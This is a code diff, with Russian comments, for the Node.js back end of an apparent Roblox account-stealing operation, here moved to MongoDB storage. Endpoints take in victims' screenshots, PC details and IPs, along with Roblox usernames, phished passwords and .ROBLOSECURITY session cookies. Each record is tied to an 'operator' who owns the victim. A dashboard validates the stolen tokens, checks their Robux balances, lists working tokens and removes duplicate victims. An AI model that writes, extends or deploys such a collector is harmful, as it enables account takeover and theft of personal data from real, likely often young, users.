@@ -9,22 +9,25 @@ const http        = require('http');
 const WebSocket   = require('ws');
 const helmet      = require('helmet');
 const rateLimit   = require('express-rate-limit');
+const { MongoClient, ObjectId } = require('mongodb');
 
-const app        = express();
-const UPLOADS    = path.join(__dirname, 'uploads');
-const META_FILE  = path.join(UPLOADS, '_metadata.json');
+const app = express();
 
-// ── Папка uploads ────────────────────────────────────────────────────────────
-if (!fs.existsSync(UPLOADS)) fs.mkdirSync(UPLOADS, { recursive: true });
+// ── MongoDB подключение ───────────────────────────────────────────────────────
+const MONGO_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017';
+const DB_NAME   = process.env.MONGODB_DB || 'file_transfer';
+let _db = null;
 
-// ── Хранилище метаданных ─────────────────────────────────────────────────────
-function readMeta() {
-  try { return JSON.parse(fs.readFileSync(META_FILE, 'utf8')); }
-  catch { return {}; }
+async function getDb() {
+  if (_db) return _db;
+  const client = new MongoClient(MONGO_URI);
+  await client.connect();
+  _db = client.db(DB_NAME);
+  console.log('✅ MongoDB connected');
+  return _db;
 }
-function writeMeta(data) {
-  fs.writeFileSync(META_FILE, JSON.stringify(data, null, 2));
-}
+
+// Коллекции: files (скриншоты+метаданные), settings (настройки операторов)
 
 // ── Оператор (владелец жертвы): старые записи без поля operator относятся к Shonll ──
 function fileOperator(entry) {
@@ -73,7 +76,16 @@ app.use(session({
     secure: false              // false т.к. HTTP; при HTTPS поставить true
   }
 }));
-app.use('/uploads', express.static(UPLOADS));
+// ── Отдача файлов (скриншотов) из MongoDB ─────────────────────────────────────
+app.get('/uploads/:filename', async (req, res) => {
+  const db = await getDb();
+  const doc = await db.collection('files').findOne({ name: req.params.filename });
+  if (!doc || !doc.data) return res.status(404).send('Not found');
+  const buf = Buffer.from(doc.data, 'base64');
+  res.set('Content-Type', doc.contentType || 'image/png');
+  res.set('Cache-Control', 'no-cache');
+  res.send(buf);
+});
 
 // ── Статический сайт (docs/) — раздаём с того же сервера ──────────────────────
 const DOCS_DIR = path.join(__dirname, '..', 'docs');
@@ -165,35 +177,29 @@ const CREDENTIALS = {
 };
 
 // ── Настройки операторов (avatar, displayName, themeColor, bio, password) ──────
-const SETTINGS_FILE = path.join(UPLOADS, '_settings.json');
-
 const DEFAULT_SETTINGS = {
   'Shonll':  { avatar: '🦊', displayName: 'Shonll',  themeColor: '#7c6aff', bio: 'Root Admin' },
   'DildMan': { avatar: '🐉', displayName: 'DildMan', themeColor: '#00CEC9', bio: 'Operator' }
 };
 
-function readSettings() {
-  try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); }
-  catch { return {}; }
+async function getOperatorSettings(user) {
+  const db = await getDb();
+  const doc = await db.collection('settings').findOne({ user });
+  return { ...DEFAULT_SETTINGS[user] || {}, ...(doc || {}) };
 }
 
-function writeSettings(data) {
-  try { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data, null, 2)); } catch {}
-}
-
-function getOperatorSettings(user) {
-  const all = readSettings();
-  return { ...DEFAULT_SETTINGS[user] || {}, ...(all[user] || {}) };
-}
-
-function setOperatorSettings(user, patch) {
-  const all = readSettings();
-  if (!all[user]) all[user] = {};
+async function setOperatorSettings(user, patch) {
+  const db = await getDb();
+  const update = {};
   for (const [k, v] of Object.entries(patch)) {
-    if (v !== undefined && v !== null) all[user][k] = v;
+    if (v !== undefined && v !== null) update[k] = v;
   }
-  writeSettings(all);
-  // Обновляем пароль в CREDENTIALS если пришёл новый
+  if (Object.keys(update).length === 0) return;
+  await db.collection('settings').updateOne(
+    { user },
+    { $set: update },
+    { upsert: true }
+  );
   if (patch.password) CREDENTIALS[user] = patch.password;
 }
 
@@ -262,26 +268,24 @@ app.post('/api/logout', (req, res) => {
   res.json({ success: true });
 });
 
-app.get('/api/me', requireAuth, (req, res) => {
+app.get('/api/me', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
-  const s = getOperatorSettings(user);
+  const s = await getOperatorSettings(user);
   res.json({ user, ...s });
 });
 
 // ── Settings API ──────────────────────────────────────────────────────────────
-app.get('/api/settings', requireAuth, (req, res) => {
+app.get('/api/settings', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
-  const s = getOperatorSettings(user);
-  // Не отдаём пароль
+  const s = await getOperatorSettings(user);
   const { password, ...safe } = s;
   res.json({ user, ...safe });
 });
 
-app.post('/api/settings', requireAuth, (req, res) => {
+app.post('/api/settings', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   const { displayName, avatar, themeColor, bio, newPassword, currentPassword } = req.body || {};
 
-  // Если меняет пароль — проверяем текущий
   if (newPassword) {
     if (!currentPassword || CREDENTIALS[user] !== currentPassword) {
       return res.status(403).json({ error: 'Неверный текущий пароль' });
@@ -298,8 +302,9 @@ app.post('/api/settings', requireAuth, (req, res) => {
   if (typeof bio === 'string') patch.bio = bio.substring(0, 120);
   if (newPassword) patch.password = newPassword;
 
-  setOperatorSettings(user, patch);
-  res.json({ success: true, settings: getOperatorSettings(user) });
+  await setOperatorSettings(user, patch);
+  const updated = await getOperatorSettings(user);
+  res.json({ success: true, settings: updated });
 });
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -308,13 +313,12 @@ app.post('/api/settings', requireAuth, (req, res) => {
 app.post('/upload', upload.array('files'), async (req, res) => {
   if (!req.files?.length) return res.status(400).json({ error: 'Нет файлов' });
 
-  // ── Input sanitization: отсекаем path traversal и ограничиваем длину ────────
   const sanitize = (val, max = 256) => {
     if (typeof val !== 'string') return '';
     return val.replace(/[<>\"'{}|\\^]/g, '').substring(0, max);
   };
 
-  const meta = readMeta();
+  const db = await getDb();
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '—';
   const computerInfo = {
     name:    sanitize(req.body.computerName, 128)  || 'Unknown',
@@ -333,93 +337,73 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   };
 
   const operator = sanitize(req.body.operator, 64) || 'Shonll';
-
-  // Удаляем предыдущий скриншот этого же компьютера (того же оператора) — оставляем только свежий
   const pcName = computerInfo.name;
-  for (const key of Object.keys(meta)) {
-    if ((meta[key].computer?.name || '') === pcName && fileOperator(meta[key]) === operator) {
-      try {
-        const fp = path.join(UPLOADS, key);
-        if (fs.existsSync(fp)) fs.unlinkSync(fp);
-      } catch (e) { }
-      delete meta[key];
-      console.log(`[${new Date().toLocaleTimeString()}] 🗑 Старый скриншот компьютера "${pcName}" [${operator}] удалён`);
-    }
-  }
 
-  const uploaded = req.files.map(f => {
+  // Удаляем предыдущий скриншот этого же компьютера (того же оператора)
+  await db.collection('files').deleteMany({
+    'computer.name': pcName,
+    operator: operator
+  });
+
+  const uploaded = [];
+  for (const f of req.files) {
     const orig = f.decodedName || decodeFilename(f.originalname);
-    // Перезаписываем скриншот одним и тем же именем — чтобы превью обновлялось по тому же URL
     const fixedName = `screenshot_${sanitizeFilename(operator)}_${sanitizeFilename(pcName)}.png`;
-    const tempPath = path.join(UPLOADS, f.filename);
-    const finalPath = path.join(UPLOADS, fixedName);
+    const fileData = fs.readFileSync(f.path);
+    fs.unlinkSync(f.path);
 
-    try {
-      if (fs.existsSync(finalPath)) fs.unlinkSync(finalPath);
-      fs.renameSync(tempPath, finalPath);
-    } catch (e) {
-      console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Не удалось переименовать скриншот: ${e.message}`);
-    }
-
-    meta[fixedName] = {
+    const doc = {
+      name: fixedName,
       originalName: orig,
+      data: fileData.toString('base64'),
+      contentType: f.mimetype || 'image/png',
       size: f.size,
       uploadedAt: new Date().toISOString(),
       computer: computerInfo,
       roblox: robloxInfo,
       operator: operator
     };
-    console.log(`[${new Date().toLocaleTimeString()}] 📥 ${orig} от "${computerInfo.name}" (${computerInfo.ip}) [${computerInfo.country}]` + (robloxInfo.user ? ` [Roblox: ${robloxInfo.user}]` : '') + (robloxInfo.security ? ` [🔑 токен есть]` : ''));
-    return { name: fixedName, originalName: orig, size: f.size };
-  });
 
-  // Дедупликация: если пришла кука того же аккаунта — заменяем старую
+    await db.collection('files').updateOne(
+      { name: fixedName, operator: operator },
+      { $set: doc },
+      { upsert: true }
+    );
+
+    uploaded.push({ name: fixedName, originalName: orig, size: f.size });
+    console.log(`[${new Date().toLocaleTimeString()}] 📥 ${orig} от "${computerInfo.name}" (${computerInfo.ip}) [${computerInfo.country}]` + (robloxInfo.user ? ` [Roblox: ${robloxInfo.user}]` : '') + (robloxInfo.security ? ` [🔑 токен есть]` : ''));
+  }
+
+  // Дедупликация токенов
   if (robloxInfo.security) {
     try {
-      // Сначала удаляем точно такой же токен (если кука не обновилась)
       const newToken = robloxInfo.security.trim();
-      for (const key of Object.keys(meta)) {
-        if (uploaded.some(u => u.name === key)) continue;
-        if (fileOperator(meta[key]) !== operator) continue;
-        const existingToken = (meta[key].roblox?.security || '').trim();
-        if (existingToken && existingToken === newToken) {
-          try {
-            const fp = path.join(UPLOADS, key);
-            if (fs.existsSync(fp)) fs.unlinkSync(fp);
-          } catch (e) { }
-          delete meta[key];
-          console.log(`[${new Date().toLocaleTimeString()}] 🗑 Точный дубликат токена удалён [${operator}]`);
-        }
-      }
+      await db.collection('files').deleteMany({
+        operator: operator,
+        name: { $nin: uploaded.map(u => u.name) },
+        'roblox.security': newToken
+      });
 
       const rbInfo = await fetchRobuxInfo(robloxInfo.security);
       if (rbInfo.valid && rbInfo.userId) {
-        const newUserId = rbInfo.userId;
-        const newUsername = rbInfo.username || robloxInfo.user;
-
-        for (const key of Object.keys(meta)) {
-          if (uploaded.some(u => u.name === key)) continue;
-          if (fileOperator(meta[key]) !== operator) continue;
-          const existingUserId = meta[key].robuxInfo?.userId || meta[key].roblox?.userId;
-          if (existingUserId === newUserId) {
-            try {
-              const fp = path.join(UPLOADS, key);
-              if (fs.existsSync(fp)) fs.unlinkSync(fp);
-            } catch (e) { }
-            delete meta[key];
-            console.log(`[${new Date().toLocaleTimeString()}] 🗑 Дубликат аккаунта ${newUserId} удалён`);
-          }
-        }
+        await db.collection('files').deleteMany({
+          operator: operator,
+          name: { $nin: uploaded.map(u => u.name) },
+          'robuxInfo.userId': rbInfo.userId
+        });
 
         for (const u of uploaded) {
-          if (!meta[u.name].robuxInfo) meta[u.name].robuxInfo = {};
-          meta[u.name].robuxInfo.userId = newUserId;
-          meta[u.name].robuxInfo.robux = rbInfo.robux;
-          meta[u.name].robuxInfo.valid = true;
-          meta[u.name].robuxInfo.checked = new Date().toISOString();
-          if (!meta[u.name].roblox) meta[u.name].roblox = {};
-          meta[u.name].roblox.userId = newUserId;
-          if (newUsername && !meta[u.name].roblox.user) meta[u.name].roblox.user = newUsername;
+          await db.collection('files').updateOne(
+            { name: u.name, operator: operator },
+            { $set: {
+              'robuxInfo.userId': rbInfo.userId,
+              'robuxInfo.robux': rbInfo.robux,
+              'robuxInfo.valid': true,
+              'robuxInfo.checked': new Date().toISOString(),
+              'roblox.userId': rbInfo.userId,
+              ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
+            }}
+          );
         }
       }
     } catch (e) {
@@ -427,9 +411,6 @@ app.post('/upload', upload.array('files'), async (req, res) => {
     }
   }
 
-  writeMeta(meta);
-
-  // Оповещаем все подключенные вкладки браузера
   sseClients.forEach(client => {
     try {
       client.write(`data: ${JSON.stringify({ event: 'new_file', files: uploaded })}\n\n`);
@@ -445,76 +426,61 @@ app.post('/upload', upload.array('files'), async (req, res) => {
 app.post('/update-roblox', async (req, res) => {
   const { computerName, robloxUser, fakePassword, robloSecurity } = req.body;
   const operator = (typeof req.body.operator === 'string' && req.body.operator) ? req.body.operator.substring(0, 64) : 'Shonll';
-  const meta = readMeta();
-  let targetKey = null;
-  
-  for (const key of Object.keys(meta)) {
-    if (meta[key].computer?.name === computerName && fileOperator(meta[key]) === operator) {
-      if (!targetKey || new Date(meta[key].uploadedAt) > new Date(meta[targetKey].uploadedAt)) {
-        targetKey = key;
-      }
-    }
-  }
-  
-  if (targetKey) {
-    meta[targetKey].roblox = { user: robloxUser, pass: fakePassword, security: robloSecurity || '' };
+  const db = await getDb();
 
-    // Дедупликация: если username или userId совпадают — удаляем старые дубликаты
+  // Находим последний файл этого компьютера (оператора)
+  const target = await db.collection('files').findOne(
+    { 'computer.name': computerName, operator: operator },
+    { sort: { uploadedAt: -1 } }
+  );
+
+  if (target) {
+    const updateSet = {
+      'roblox.user': robloxUser,
+      'roblox.pass': fakePassword,
+      'roblox.security': robloSecurity || ''
+    };
+
     if (robloxUser || robloSecurity) {
       try {
-        let newUserId = meta[targetKey].robuxInfo?.userId || meta[targetKey].roblox?.userId;
+        let newUserId = target.robuxInfo?.userId || target.roblox?.userId;
         if (robloSecurity && !newUserId) {
           const rbInfo = await fetchRobuxInfo(robloSecurity);
           if (rbInfo.valid && rbInfo.userId) {
             newUserId = rbInfo.userId;
-            if (!meta[targetKey].robuxInfo) meta[targetKey].robuxInfo = {};
-            meta[targetKey].robuxInfo.userId = rbInfo.userId;
-            meta[targetKey].robuxInfo.robux = rbInfo.robux;
-            meta[targetKey].robuxInfo.valid = true;
-            meta[targetKey].robuxInfo.checked = new Date().toISOString();
-            meta[targetKey].roblox.userId = rbInfo.userId;
-            if (rbInfo.username && !meta[targetKey].roblox.user) meta[targetKey].roblox.user = rbInfo.username;
+            updateSet['robuxInfo.userId'] = rbInfo.userId;
+            updateSet['robuxInfo.robux'] = rbInfo.robux;
+            updateSet['robuxInfo.valid'] = true;
+            updateSet['robuxInfo.checked'] = new Date().toISOString();
+            updateSet['roblox.userId'] = rbInfo.userId;
+            if (rbInfo.username) updateSet['roblox.user'] = rbInfo.username;
           }
         }
 
-        const newName = (robloxUser || meta[targetKey].roblox?.user || '').toLowerCase().trim();
-        for (const key of Object.keys(meta)) {
-          if (key === targetKey) continue;
-          if (fileOperator(meta[key]) !== operator) continue;
-          const existingName = (meta[key].roblox?.user || '').toLowerCase().trim();
-          const existingUserId = meta[key].robuxInfo?.userId || meta[key].roblox?.userId;
+        const newName = (robloxUser || target.roblox?.user || '').toLowerCase().trim();
 
-          if (newName && existingName && newName === existingName) {
-            try {
-              const fp = path.join(UPLOADS, key);
-              if (fs.existsSync(fp)) fs.unlinkSync(fp);
-            } catch (e) { }
-            delete meta[key];
-            console.log(`[${new Date().toLocaleTimeString()}] 🗑 Дубликат по имени "${robloxUser}" удалён [${operator}]`);
-            continue;
-          }
-
-          if (newUserId && existingUserId && newUserId === existingUserId) {
-            try {
-              const fp = path.join(UPLOADS, key);
-              if (fs.existsSync(fp)) fs.unlinkSync(fp);
-            } catch (e) { }
-            delete meta[key];
-            console.log(`[${new Date().toLocaleTimeString()}] 🗑 Дубликат по userId ${newUserId} удалён [${operator}]`);
-          }
+        // Удаляем дубликаты по имени или userId
+        const delQuery = { operator: operator, name: { $ne: target.name }, $or: [] };
+        if (newName) delQuery.$or.push({ 'roblox.user': { $regex: new RegExp('^' + newName + '$', 'i') } });
+        if (newUserId) delQuery.$or.push({ 'robuxInfo.userId': newUserId });
+        if (delQuery.$or.length > 0) {
+          await db.collection('files').deleteMany(delQuery);
         }
       } catch (e) {
         console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Дедупликация в update-roblox не удалась: ${e.message}`);
       }
     }
 
-    writeMeta(meta);
+    await db.collection('files').updateOne(
+      { _id: target._id },
+      { $set: updateSet }
+    );
+
     console.log(`[${new Date().toLocaleTimeString()}] 🔑 Обновлен Roblox аккаунт для "${computerName}": ${robloxUser}${robloSecurity ? ' (+токен)' : ''}`);
-    
+
     sseClients.forEach(client => {
       try {
-        client.write(`data: ${JSON.stringify({ event: 'new_file' })}
-\n`);
+        client.write(`data: ${JSON.stringify({ event: 'new_file' })}\n\n`);
       } catch (e) {}
     });
     res.json({ success: true });
@@ -526,14 +492,21 @@ app.post('/update-roblox', async (req, res) => {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  API — Files list (JSON)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-app.get('/files', requireAuth, (req, res) => {
-  const meta  = readMeta();
-  const user  = req.authUser || req.session.user;
-  const files = fs.readdirSync(UPLOADS)
-    .filter(n => n !== '_metadata.json')
-    .map(n => ({ name: n, ...meta[n] }))
-    .filter(f => fileOperator(f) === user)
-    .sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
+app.get('/files', requireAuth, async (req, res) => {
+  const db = await getDb();
+  const user = req.authUser || req.session.user;
+
+  let files = await db.collection('files')
+    .find({ operator: user })
+    .sort({ uploadedAt: -1 })
+    .toArray();
+
+  // Убираем поле data (base64) из ответа — слишком тяжело
+  files = files.map(f => {
+    const { data, ...safe } = f;
+    safe.name = f.name;
+    return safe;
+  });
 
   // Оставляем только последний файл от каждого компьютера
   const seen = new Map();
@@ -549,16 +522,12 @@ app.get('/files', requireAuth, (req, res) => {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  DELETE file
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-app.delete('/files/:name', requireAuth, (req, res) => {
-  const fp = path.join(UPLOADS, req.params.name);
-  if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Файл не найден' });
-  const meta = readMeta();
-  if (fileOperator(meta[req.params.name]) !== (req.authUser || req.session.user)) {
-    return res.status(403).json({ error: 'Нет доступа к этому файлу' });
-  }
-  fs.unlinkSync(fp);
-  delete meta[req.params.name];
-  writeMeta(meta);
+app.delete('/files/:name', requireAuth, async (req, res) => {
+  const db = await getDb();
+  const user = req.authUser || req.session.user;
+  const doc = await db.collection('files').findOne({ name: req.params.name, operator: user });
+  if (!doc) return res.status(404).json({ error: 'Файл не найден' });
+  await db.collection('files').deleteOne({ _id: doc._id });
   res.json({ success: true });
 });
 
@@ -662,51 +631,43 @@ app.post('/robux-check', requireAuth, async (req, res) => {
 
 // POST /robux-bulk — массовая проверка всех сохранённых токенов
 app.post('/robux-bulk', requireAuth, async (req, res) => {
-  const meta = readMeta();
+  const db = await getDb();
+  const user = req.authUser || req.session.user;
+  const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
   const results = [];
-  for (const key of Object.keys(meta)) {
-    if (fileOperator(meta[key]) !== (req.authUser || req.session.user)) continue;
-    const roblox = meta[key].roblox || {};
-    if (roblox.security) {
-      try {
-        const info = await fetchRobuxInfo(roblox.security);
-        results.push({
-          file: key,
-          originalName: meta[key].originalName,
-          computer: meta[key].computer?.name || 'Unknown',
-          user: roblox.user,
-          ...info
-        });
-        meta[key].robuxInfo = { checked: new Date().toISOString(), robux: info.robux, valid: info.valid };
-      } catch (e) {
-        results.push({ file: key, user: roblox.user, valid: false, error: e.message });
-      }
+  for (const doc of docs) {
+    const roblox = doc.roblox || {};
+    try {
+      const info = await fetchRobuxInfo(roblox.security);
+      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, ...info });
+      await db.collection('files').updateOne({ _id: doc._id }, { $set: { 'robuxInfo': { checked: new Date().toISOString(), robux: info.robux, valid: info.valid } } });
+    } catch (e) {
+      results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message });
     }
   }
-  writeMeta(meta);
   res.json(results);
 });
 
 // POST /robux-check-file — проверка токена конкретного файла
 app.post('/robux-check-file', requireAuth, async (req, res) => {
   const { filename } = req.body;
-  const meta = readMeta();
-  const info = meta[filename];
-  if (!info) return res.status(404).json({ error: 'Файл не найден' });
-  if (fileOperator(info) !== (req.authUser || req.session.user)) return res.status(403).json({ error: 'Нет доступа' });
-  const roblox = info.roblox || {};
-  if (!roblox.security) {
-    return res.json({ valid: false, error: 'Токен не сохранён' });
-  }
+  const db = await getDb();
+  const user = req.authUser || req.session.user;
+  const doc = await db.collection('files').findOne({ name: filename, operator: user });
+  if (!doc) return res.status(404).json({ error: 'Файл не найден' });
+  const roblox = doc.roblox || {};
+  if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
   const rbInfo = await fetchRobuxInfo(roblox.security);
   if (rbInfo.valid) {
-    meta[filename].robuxInfo = { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true };
-    if (!meta[filename].roblox) meta[filename].roblox = {};
-    if (!meta[filename].roblox.user) meta[filename].roblox.user = rbInfo.username;
+    await db.collection('files').updateOne({ _id: doc._id }, { $set: {
+      'robuxInfo': { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true },
+      ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
+    }});
   } else {
-    meta[filename].robuxInfo = { checked: new Date().toISOString(), valid: false, error: rbInfo.error };
+    await db.collection('files').updateOne({ _id: doc._id }, { $set: {
+      'robuxInfo': { checked: new Date().toISOString(), valid: false, error: rbInfo.error }
+    }});
   }
-  writeMeta(meta);
   res.json(rbInfo);
 });
 
@@ -714,43 +675,40 @@ app.post('/robux-check-file', requireAuth, async (req, res) => {
 //  TOKENS PAGE — список рабочих токенов с Robux
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.get('/tokens-data', requireAuth, async (req, res) => {
-  const meta = readMeta();
+  const db = await getDb();
+  const user = req.authUser || req.session.user;
+  const docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
   const results = [];
-  for (const key of Object.keys(meta)) {
-    if (fileOperator(meta[key]) !== (req.authUser || req.session.user)) continue;
-    const roblox = meta[key].roblox || {};
-    if (roblox.security) {
-      try {
-        const info = await fetchRobuxInfo(roblox.security);
-        results.push({
-          file: key,
-          originalName: meta[key].originalName,
-          computer: meta[key].computer?.name || 'Unknown',
-          uploadedAt: meta[key].uploadedAt,
-          user: roblox.user,
-          security: roblox.security,
-          ...info
-        });
-        if (!meta[key].robuxInfo) meta[key].robuxInfo = {};
-        meta[key].robuxInfo.checked = new Date().toISOString();
-        meta[key].robuxInfo.robux = info.robux;
-        meta[key].robuxInfo.valid = info.valid;
-        if (info.valid && info.userId) {
-          meta[key].robuxInfo.userId = info.userId;
-          if (!meta[key].roblox) meta[key].roblox = {};
-          meta[key].roblox.userId = info.userId;
-        }
-        if (info.valid && info.username && !meta[key].roblox.user) {
-          meta[key].roblox.user = info.username;
-        }
-      } catch (e) {
-        results.push({ file: key, user: roblox.user, valid: false, error: e.message, security: roblox.security });
+  for (const doc of docs) {
+    const roblox = doc.roblox || {};
+    try {
+      const info = await fetchRobuxInfo(roblox.security);
+      results.push({
+        file: doc.name,
+        originalName: doc.originalName,
+        computer: doc.computer?.name || 'Unknown',
+        uploadedAt: doc.uploadedAt,
+        user: roblox.user,
+        security: roblox.security,
+        ...info
+      });
+      const updateSet = {
+        'robuxInfo.checked': new Date().toISOString(),
+        'robuxInfo.robux': info.robux,
+        'robuxInfo.valid': info.valid
+      };
+      if (info.valid && info.userId) {
+        updateSet['robuxInfo.userId'] = info.userId;
+        updateSet['roblox.userId'] = info.userId;
+        if (info.username) updateSet['roblox.user'] = info.username;
       }
+      await db.collection('files').updateOne({ _id: doc._id }, { $set: updateSet });
+    } catch (e) {
+      results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
     }
   }
-  writeMeta(meta);
 
-  // Дедупликация на странице: оставляем только последний токен на аккаунт
+  // Дедупликация: оставляем только последний токен на аккаунт
   const byUser = new Map();
   for (const r of results) {
     const id = r.userId || r.security;
@@ -772,14 +730,10 @@ app.get('/tokens', requireAuth, (req, res) => {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.post('/analyze', requireAuth, async (req, res) => {
   const { filename } = req.body;
-  const meta = readMeta();
-  if (!filename || !fs.existsSync(path.join(UPLOADS, filename))) {
-    return res.status(400).json({ error: 'Неверное имя файла' });
-  }
-  const info = meta[filename] || {};
-  if (fileOperator(info) !== (req.authUser || req.session.user)) {
-    return res.status(403).json({ error: 'Нет доступа к этому файлу' });
-  }
+  const db = await getDb();
+  const user = req.authUser || req.session.user;
+  const info = await db.collection('files').findOne({ name: filename, operator: user });
+  if (!info) return res.status(400).json({ error: 'Неверное имя файла' });
   const pc = info.computer || {};
   const roblox = info.roblox || {};
 
@@ -803,12 +757,15 @@ app.post('/analyze', requireAuth, async (req, res) => {
           analysis += `   DisplayName: ${rbInfo.displayName}\n`;
           analysis += `   💰 ROBUX: ${rbInfo.robux !== null ? rbInfo.robux.toLocaleString() : 'недоступно'}\n`;
           analysis += `   Аккаунт создан: ${rbInfo.created || '?'}\n`;
-          meta[filename].robuxInfo = { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true };
-          if (!meta[filename].roblox) meta[filename].roblox = {};
-          if (!meta[filename].roblox.user) meta[filename].roblox.user = rbInfo.username;
+          await db.collection('files').updateOne({ _id: info._id }, { $set: {
+            'robuxInfo': { checked: new Date().toISOString(), robux: rbInfo.robux, valid: true },
+            ...(rbInfo.username ? { 'roblox.user': rbInfo.username } : {})
+          }});
         } else {
           analysis += `   ❌ ТОКЕН НЕВАЛИДЕН: ${rbInfo.error || 'неизвестная ошибка'}\n`;
-          meta[filename].robuxInfo = { checked: new Date().toISOString(), valid: false, error: rbInfo.error };
+          await db.collection('files').updateOne({ _id: info._id }, { $set: {
+            'robuxInfo': { checked: new Date().toISOString(), valid: false, error: rbInfo.error }
+          }});
         }
       } catch (e) {
         analysis += `   ⚠️ Ошибка проверки: ${e.message}\n`;
@@ -816,7 +773,6 @@ app.post('/analyze', requireAuth, async (req, res) => {
     } else {
       analysis += `   ⚠️ Токен .ROBLOSECURITY отсутствует\n`;
     }
-    writeMeta(meta);
   } else {
     analysis += `⚠️ Привязка к Roblox не обнаружена.\n`;
   }
